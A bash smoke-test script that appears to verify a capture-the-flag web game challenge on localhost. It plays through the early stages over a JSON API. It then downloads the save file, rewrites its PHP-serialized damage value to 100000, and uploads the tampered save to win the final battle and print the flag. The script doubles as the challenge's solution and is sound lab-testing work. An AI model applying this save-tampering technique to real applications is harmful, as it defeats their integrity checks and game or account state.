#!/usr/bin/env bash

set -euo pipefail

BASE_URL="${1:-http://127.0.0.1:15001}"
WORK_DIR="$(mktemp -d)"
COOKIE_JAR="$WORK_DIR/cookies.txt"
SAVE_FILE="$WORK_DIR/arena.sav"
HACKED_SAVE="$WORK_DIR/arena-hacked.sav"

cleanup() { rm -rf "$WORK_DIR"; }
trap cleanup EXIT

post() {
    curl -fsS -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
        -H 'Content-Type: application/json' \
        -X POST "$BASE_URL/api/game.php" \
        --data "$1"
}

stage_of() { python3 -c 'import json,sys; print(json.load(sys.stdin)["state"]["stage"])'; }
pending_of() { python3 -c 'import json,sys; print(json.load(sys.stdin)["state"]["pending_stage"])'; }
defeat_message_of() { python3 -c 'import json,sys; print(json.load(sys.stdin)["state"].get("defeat_message", ""))'; }
advantage_enemy_id() {
    post '{"action":"status"}' | python3 -c 'import json,sys; state=json.load(sys.stdin)["state"]; target={"fire":"grass","water":"fire","grass":"water"}[state["trainer"]["type"]]; print(next(enemy["id"] for enemy in state["level2"]["encounters"] if enemy["type"] == target))'
}

echo '[1/11] reset and start'
post '{"action":"reset"}' >/dev/null
post '{"action":"start","name":"smoke-test","starter":"charmander"}' >/dev/null

echo '[2/11] walk into four level-1 encounters'
for id in meadow-1 meadow-2 meadow-3 meadow-4; do
    post "{\"action\":\"encounter\",\"id\":\"$id\"}" >/dev/null
    response="$(post '{"action":"battle_resolve"}')"
done
[[ "$(printf '%s' "$response" | stage_of)" == 1 ]]
[[ "$(printf '%s' "$response" | pending_of)" == 2 ]]

echo '[3/11] acknowledge level-1 congratulations'
post '{"action":"advance_stage"}' >/dev/null

echo '[4/11] choose an advantageous level-2 encounter'
for _ in 1 2; do
    level2_id="$(advantage_enemy_id)"
    post "{\"action\":\"encounter\",\"id\":\"$level2_id\"}" >/dev/null
    response="$(post '{"action":"battle_resolve"}')"
done
[[ "$(printf '%s' "$response" | stage_of)" == 2 ]]
[[ "$(printf '%s' "$response" | pending_of)" == 3 ]]

echo '[5/11] acknowledge level-2 congratulations'
post '{"action":"advance_stage"}' >/dev/null

echo '[6/11] walk to NullByte and show a defeat banner'
post '{"action":"encounter","id":"nullbyte-core"}' >/dev/null
curl -fsS -o "$WORK_DIR/normal.json" \
    -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
    -H 'Content-Type: application/json' -X POST "$BASE_URL/api/game.php" \
    --data '{"action":"battle_resolve"}'
[[ "$(cat "$WORK_DIR/normal.json" | stage_of)" == 1 ]]
[[ -n "$(cat "$WORK_DIR/normal.json" | defeat_message_of)" ]]

echo '[7/11] dismiss banner and replay level 1 and level 2'
post '{"action":"dismiss_defeat"}' >/dev/null
for id in meadow-1 meadow-2 meadow-3 meadow-4; do
    post "{\"action\":\"encounter\",\"id\":\"$id\"}" >/dev/null
    post '{"action":"battle_resolve"}' >/dev/null
done
post '{"action":"advance_stage"}' >/dev/null
for _ in 1 2; do
    level2_id="$(advantage_enemy_id)"
    post "{\"action\":\"encounter\",\"id\":\"$level2_id\"}" >/dev/null
    post '{"action":"battle_resolve"}' >/dev/null
done
post '{"action":"advance_stage"}' >/dev/null
post '{"action":"encounter","id":"nullbyte-core"}' >/dev/null

echo '[8/11] persistent save'
curl -fsS -b "$COOKIE_JAR" "$BASE_URL/api/save-load.php?action=save" -o "$SAVE_FILE"

echo '[9/11] mutate serialized damage and load it back'
python3 - "$SAVE_FILE" "$HACKED_SAVE" <<'PY'
from pathlib import Path
import re
import sys

source = Path(sys.argv[1])
target = Path(sys.argv[2])
data = source.read_bytes()
data, count = re.subn(rb'(s:6:"damage";i:)\d+(;)', rb'\g<1>100000\2', data, count=1)
if count != 1:
    raise SystemExit('Trainer damage field not found')
target.write_bytes(data)
PY
curl -fsS -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
    -F "save=@$HACKED_SAVE;filename=arena-hacked.sav" \
    "$BASE_URL/api/save-load.php?action=load" | grep -F 'Load save thành công' >/dev/null

echo '[10/11] damage override wins and reveals flag'
response="$(post '{"action":"battle_resolve"}')"
[[ "$(printf '%s' "$response" | stage_of)" == 4 ]]
printf '%s\n' "$response"
echo '[11/11] smoke test complete'
echo 'SMOKE TEST PASSED'
